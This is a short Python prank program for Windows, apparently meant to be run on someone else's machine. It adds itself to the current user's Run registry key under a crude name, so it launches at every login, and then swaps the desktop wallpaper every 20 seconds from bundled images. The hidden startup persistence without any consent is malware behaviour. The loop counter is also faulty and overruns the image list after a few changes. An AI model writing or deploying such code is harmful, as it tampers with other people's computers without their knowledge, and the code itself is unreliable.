import ctypes
import os
from time import sleep
import sys


SPI_SETDESKWALLPAPER = 20
path = os.path.dirname(os.path.realpath(__file__))
name1 = r'build\792.jpg'
name2 = r'build\download (1).png'
name3 = r'build\PRniMI.jpg'
name4 = r'build\10-500x500.jpg'

backgroundlist = [name1,name2,name3,name4]
x = 1
def REGEDIT():
    errorraised = False
    try:
        import winreg
    except ImportError:
  
        errorraised = True
    if errorraised == False:
        filepath = sys.argv[0]
        filepath = '"' + filepath + '"'
        key = winreg.HKEY_CURRENT_USER
        key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
        open = winreg.OpenKey(key, key_value, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(open, "ShittyInstagramVanHalen", 0, winreg.REG_SZ, filepath)
        winreg.CloseKey(open)
def changewallpaper():
    while True:
        global x
        newpath = os.path.join(path,backgroundlist[x])
        str(newpath)
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0,newpath , 3)
        sleep(20)
        x += 1
REGEDIT()
changewallpaper()
